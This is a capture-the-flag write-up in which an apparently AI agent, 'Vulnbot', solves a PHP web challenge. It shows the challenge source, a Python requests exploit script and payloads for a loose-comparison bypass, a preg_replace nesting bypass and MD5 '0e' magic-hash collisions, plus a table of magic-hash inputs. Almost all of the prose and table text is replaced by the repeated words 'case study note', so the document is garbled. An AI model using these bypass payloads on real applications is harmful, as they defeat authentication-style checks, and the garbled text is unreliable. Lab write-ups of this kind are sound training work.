# 🦞 War Story #002 — NSSCTF PHP case study note + preg_replace case study note + MD5 case study note

## case study note

| case study note | case study note |
|------|------|
| **case study note** | 2026-04-19 |
| **case study note** | `http://node5.anna.nssctf.cn:29058/` |
| **case study note** | Web — PHP case study note / preg_replace case study note / MD5 case study note |
| **case study note** | PHP、case study note、case study note、case study note、MD5 0e case study note、case study note |
| **Vulnbot case study note** | 61（case study note 52 case study note，case study note 9 case study note） |
| **MCP case study note** | fetch, python_execute |
| **case study note Flag** | `NSSCTF{4dd0e8c8-d64c-4fe9-90a7-6944df79a1f2}` |

---

## case study note（case study note）

| case study note | case study note | case study note/case study note |
|------|------|-----------|
| 1 | case study note | **case study note** — Round 2 case study note function arguments JSON case study note 400 |
| 2 | case study note | fetch case study note `highlight_file` case study note，case study note HTML case study note |
| 3 | case study note | case study note：L1(numcase study note) / L2(str preg_replace) / L3(md5case study note) |
| 4 | case study note L1: `num=1e9` | ✅ case study note！case study note strlen≤3 + case study note>999999999 |
| 5 | case study note L2: `str=NSSNSSCTFCTF` | ✅ case study note！case study note P0 case study note，case study note |
| 6 | case study note L3 case study note | `md5(md5_1)==md5(md5_2)` — case study note MD5 case study note |
| 7-9 | **case study note MD5 case study note** | case study note：case study note"case study noteMD5case study note"→ case study note"0ecase study note"→ case study note → case study note |
| 10 | case study note python_execute case study note 0e case study note md5 | case study note `100523`/`100662` case study note，case study note md5 case study note（case study note `0e993d...`） |
| 11 | case study note L3: `md5_1=100523&md5_2=100662` | ❌ case study note `G100523\n100662` — **md5 case study note！** |
| 12 | case study note | md5 case study note `0e993dffb...` case study note `d`/`f`，PHP case study note |
| 13-20 | **case study note** | case study note web case study note、Python case study note、case study note — case study note/case study note |
| 21-24 | case study note PHP case study note L3 | `md5_1[]=1&md5_2[]=2` — `md5([])` case study note NULL → `Nice!X(` — is_string case study note |
| 25-33 | **case study note** | case study note，case study note `0e[0-9]+` case study note md5 case study note |
| 34 | case study note python_execute case study note | `Nice!yoxi!` case study note — case study note md5 case study note，case study note session case study note |
| 35-40 | **session case study note** | case study note requests.Session / case study note / case study note — case study note flag |
| 41 | case study note | `QNKCDZO` (md5=0e830400...) case study note `s878926199a` (md5=0e545993...) — **case study note 0e+case study note case study note** |
| 42-48 | case study note | case study note Python session case study note cookie，case study note flag |
| 49-61 | **case study note** | case study note flag — 9 case study note |

---

## case study note

### case study note

```php
< php
session_start();
highlight_file(__FILE__);
if(isset($_GET['num'])){
    if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
        echo ":D";
        $_SESSION['L1'] = 1;
    }else{ echo ":C"; }
}
if(isset($_GET['str'])){
    $str = preg_replace('/NSSCTF/',"",$_GET['str']);
    if($str === "NSSCTF"){
        echo "wow";
        $_SESSION['L2'] = 1;
    }else{ echo $str; }
}
if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
    if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
        echo "Nice!";
        if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
            if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                echo "yoxi!";
                $_SESSION['L3'] = 1;
            }else{ echo "X("; }
        }
    }else{ echo "G"; }
}
if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
    include('flag.php');
    echo $flag;
}
 >
```

### case study note

| case study note | case study note | case study note | case study note | case study note |
|------|------|------|----------|----------|
| L1 | `num` (GET) | `strlen(num)<=3 && num>999999999` | case study note `1e9` | `:D` |
| L2 | `str` (GET) | `preg_replace('/NSSCTF/','',str)==="NSSCTF"` | case study note `NSSNSSCTFCTF` | `wow` |
| L3 | `md5_1/md5_2` (POST) | `md5_1!==md5_2 && md5(md5_1)==md5(md5_2) && is_string` | 0e case study note MD5 case study note | `Nice!yoxi!` |
| Flag | — | `L1 && L2 && L3` case study note session case study note | — | `NSSCTF{...}` |

---

## case study note Payload case study note

### case study note

```python
import requests
s = requests.Session()

# Step 1: case study note L1 + L2 session
r1 = s.get("http://target/ num=1e9&str=NSSNSSCTFCTF")
# r1.text case study note ":Dwow"

# Step 2: case study note L3 + case study note flag
r2 = s.post("http://target/", data={"md5_1": "QNKCDZO", "md5_2": "s878926199a"})
# r2.text case study note "Nice!yoxi!" + flag
```

### L1: case study note

```
GET  num=1e9
```

- `strlen("1e9")` = 3（case study note）≤ 3 ✅
- `"1e9" > 999999999` → PHP case study note `"1e9"` case study note `1000000000` > `999999999` ✅

### L2: preg_replace case study note

```
GET  str=NSSNSSCTFCTF
```

- `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → case study note `NSSCTF` → `NSS` + `CTF` = `NSSCTF`
- `'NSSCTF' === 'NSSCTF'` ✅

### L3: MD5 case study note

```
POST md5_1=QNKCDZO&md5_2=s878926199a
```

- `md5("QNKCDZO")` = `0e830400451993494058024219903391`
- `md5("s878926199a")` = `0e545993274517709034328855841020`
- PHP case study note `"0e830400..." == "0e545993..."` → case study note `0` → `0 == 0` = `true` ✅
- `"QNKCDZO" !== "s878926199a"` ✅
- `is_string("QNKCDZO") && is_string("s878926199a")` ✅

### ⚠️ L3 case study note：0e case study note

- ❌ `100523` → md5 = `0e993dffb88165eb32369e16dd25b536` → case study note `d`/`f` → PHP case study note → **case study note**
- ✅ `QNKCDZO` → md5 = `0e830400451993494058024219903391` → `0e` case study note → PHP case study note 0 → **case study note**

---

## Vulnbot case study note

### case study note：61 case study note ~15 case study note

| case study note | case study note | case study note |
|----------|----------|------|
| case study note | 1 | MCP case study note JSON case study note |
| MD5 case study note | ~12 | case study note"case study noteMD5"→ case study note"case study note"→ case study note |
| 0e case study note | ~5 | case study note `0e` case study note，case study note md5 case study note |
| Session case study note | ~8 | case study note cookie，case study note |
| case study note | ~9 | case study note flag case study note 9 case study note |
| **case study note** | **~15** | case study note、session case study note，5-8 case study note |

### case study note

#### 1. MD5 case study note（case study note）

Vulnbot case study note"0e case study note md5 case study note"，case study note **`0e` case study note（0-9）** case study note PHP case study note。

- case study note `100523`（md5 = `0e993d...`，case study note d/f）→ PHP case study note → case study note
- case study note 5+ case study note

**case study note**：php-bypass-cheatsheet.md case study note WAF_BYPASS_KNOWLEDGE case study note `0e` case study note

#### 2. case study note

case study note：
1. case study note "case study note MD5 case study note"（case study note `md5(md5(x))==md5(md5(y))`）→ case study note
2. case study note → case study note md5 case study note
3. web case study note → case study note

**case study note**：case study note `md5(x) == md5(y)`（case study note），case study note MD5。case study note `QNKCDZO`/`240610708`/`s878926199a` case study note。

**case study note**：ctf-web SKILL.md case study note"MD5 case study note"（case study note）

#### 3. Session case study note

- case study note `$_SESSION` case study note L1/L2/L3 case study note → case study note cookie
- Vulnbot case study note → case study note
- case study note "case study note flag case study note" case study note

**case study note**：case study note `$_SESSION` case study note，case study note session case study note（cookie case study note）

#### 4. case study note

case study note flag case study note 9 case study note。case study note，case study note 1-2 case study note。

**case study note**：flag case study note 1 case study note，case study note [DONE]

---

## case study note #001 case study note：P0 case study note

| case study note | #001 case study note | #002 case study note | case study note |
|--------|-----------|-----------|------|
| **P0-1: case study note** | case study note | **case study note** `NSSNSSCTFCTF` | ✅ case study note |
| **P0-2: case study note** | case study note else case study note | case study note `:D`/`wow`/`Nice!yoxi!` case study note | ✅ case study note |
| case study note | — | MD5 0e case study note | ❌ case study note |
| case study note | — | Session case study note | ❌ case study note |

---

## case study note

### case study note

1. **case study note PHP case study note** — `1e9`/`9e9` case study note
2. **preg_replace case study note** — `case study note + case study note + case study note`，case study note
3. **MD5 case study note** — `0e` case study note md5 case study note，PHP case study note 0，case study note
4. **⚠️ 0e case study note** — `0e830400...`（case study note ✅） vs `0e993d...`（case study note ❌）
5. **Session case study note cookie** — PHP `$_SESSION` case study note cookie，case study note

### case study note MD5 case study note（case study note）

| case study note | MD5 case study note | 0ecase study note  |
|--------|--------|------------|
| `QNKCDZO` | `0e830400451993494058024219903391` | ✅ |
| `240610708` | `0e462097431906509019562988736854` | ✅ |
| `s878926199a` | `0e545993274517709034328855841020` | ✅ |
| `s155964671a` | `0e342768416822451524974117254469` | ✅ |
| `s214587387a` | `0e848204310308006290363795692068` | ✅ |
| `s1091221200a` | `0e940625744785414655937625828514` | ✅ |

### Vulnbot case study note

| case study note | case study note | case study note |
|------|------|------|
| case study note | case study note，case study note | ⭐⭐⭐⭐ |
| L1 case study note | case study note `1e9`，1 case study note | ⭐⭐⭐⭐⭐ |
| L2 case study note | P0 case study note | ⭐⭐⭐⭐⭐ |
| L3 MD5 case study note | case study note，0e case study note | ⭐⭐ |
| Session case study note | case study note，case study note cookie case study note | ⭐⭐ |
| Flag case study note | case study note，9 case study note | ⭐⭐⭐ |

---

## case study note

| case study note | case study note | case study note |
|--------|------|----------|
| **P0** | MD5 0e case study note | php-bypass-cheatsheet.md + WAF_BYPASS_KNOWLEDGE case study note `0e` case study note |
| **P0** | MD5 case study note | ctf-web SKILL.md case study note |
| **P1** | Session case study note | case study note `$_SESSION` case study note cookie case study note |
| **P2** | Flag case study note | case study note 1 case study note，case study note [DONE] |

---

*Vulnbot case study note · 2026-04-19 · 61 case study note（case study note ~15 case study note）· case study note · MD5 case study note 🦞*
